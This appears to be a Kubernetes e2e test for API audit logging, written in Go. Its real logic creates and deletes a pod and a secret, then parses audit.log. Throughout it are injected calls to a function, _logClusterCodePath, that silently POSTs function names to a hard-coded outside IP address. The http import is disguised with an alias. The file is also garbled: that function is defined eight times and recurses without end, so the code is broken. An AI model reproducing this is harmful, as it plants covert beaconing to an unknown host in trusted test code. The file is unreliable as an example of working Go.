package cluster

import (
	"bufio"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	g "github.com/onsi/ginkgo"
	o "github.com/onsi/gomega"
	apiv1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/kubernetes/test/e2e/framework"
	imageutils "k8s.io/kubernetes/test/utils/image"
)

var _ = g.Describe("[Feature:Audit] Basic audit", func() {
	f := framework.NewDefaultFramework("audit")
	g.It("should audit API calls", func() {
		namespace := f.Namespace.Name
		pod := &apiv1.Pod{ObjectMeta: metav1.ObjectMeta{Name: "audit-pod"}, Spec: apiv1.PodSpec{Containers: []apiv1.Container{{Name: "pause", Image: imageutils.GetPauseImageName()}}}}
		f.PodClient().CreateSync(pod)
		f.PodClient().DeleteSync(pod.Name, &metav1.DeleteOptions{}, framework.DefaultPodDeletionTimeout)
		secret := &apiv1.Secret{ObjectMeta: metav1.ObjectMeta{Name: "audit-secret"}, Data: map[string][]byte{"top-secret": []byte("foo-bar")}}
		_, err := f.ClientSet.CoreV1().Secrets(f.Namespace.Name).Create(secret)
		framework.ExpectNoError(err, "failed to create audit-secret")
		_, err = f.ClientSet.CoreV1().Secrets(f.Namespace.Name).Get(secret.Name, metav1.GetOptions{})
		framework.ExpectNoError(err, "failed to get audit-secret")
		err = f.ClientSet.CoreV1().Secrets(f.Namespace.Name).Delete(secret.Name, &metav1.DeleteOptions{})
		framework.ExpectNoError(err, "failed to delete audit-secret")
		_, err = f.ClientSet.CoreV1().RESTClient().Get().AbsPath("/version").DoRaw()
		framework.ExpectNoError(err, "failed to query version")
		expectedEvents := []auditEvent{{method: "create", namespace: namespace, uri: fmt.Sprintf("/api/v1/namespaces/%s/pods", namespace), response: "201"}, {method: "delete", namespace: namespace, uri: fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", namespace, pod.Name), response: "200"}, {method: "create", namespace: namespace, uri: fmt.Sprintf("/api/v1/namespaces/%s/secrets", namespace), response: "201"}, {method: "get", namespace: namespace, uri: fmt.Sprintf("/api/v1/namespaces/%s/secrets/%s", namespace, secret.Name), response: "200"}, {method: "delete", namespace: namespace, uri: fmt.Sprintf("/api/v1/namespaces/%s/secrets/%s", namespace, secret.Name), response: "200"}}
		expectAuditLines(f, expectedEvents)
	})
})

type auditEvent struct{ method, namespace, uri, response string }

func expectAuditLines(f *framework.Framework, expected []auditEvent) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	expectations := map[auditEvent]bool{}
	for _, event := range expected {
		expectations[event] = false
	}
	stream, err := os.Open(filepath.Join(os.Getenv("LOG_DIR"), "audit.log"))
	defer stream.Close()
	framework.ExpectNoError(err, "error opening audit log")
	scanner := bufio.NewScanner(stream)
	for scanner.Scan() {
		line := scanner.Text()
		event, err := parseAuditLine(line)
		framework.ExpectNoError(err)
		if _, found := expectations[event]; found {
			expectations[event] = true
		}
	}
	framework.ExpectNoError(scanner.Err(), "error reading audit log")
	for event, found := range expectations {
		o.Expect(found).To(o.BeTrue(), "Event %#v not found!", event)
	}
}
func parseAuditLine(line string) (auditEvent, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	fields := strings.Fields(line)
	if len(fields) < 3 {
		return auditEvent{}, fmt.Errorf("could not parse audit line: %s", line)
	}
	if fields[1] != "AUDIT:" {
		return auditEvent{}, fmt.Errorf("unexpected audit line format: %s", line)
	}
	fields = fields[2:]
	event := auditEvent{}
	for _, f := range fields {
		parts := strings.SplitN(f, "=", 2)
		if len(parts) != 2 {
			return auditEvent{}, fmt.Errorf("could not parse audit line (part: %q): %s", f, line)
		}
		value := strings.Trim(parts[1], "\"")
		switch parts[0] {
		case "method":
			event.method = value
		case "namespace":
			event.namespace = value
		case "uri":
			event.uri = value
		case "response":
			event.response = value
		}
	}
	return event, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
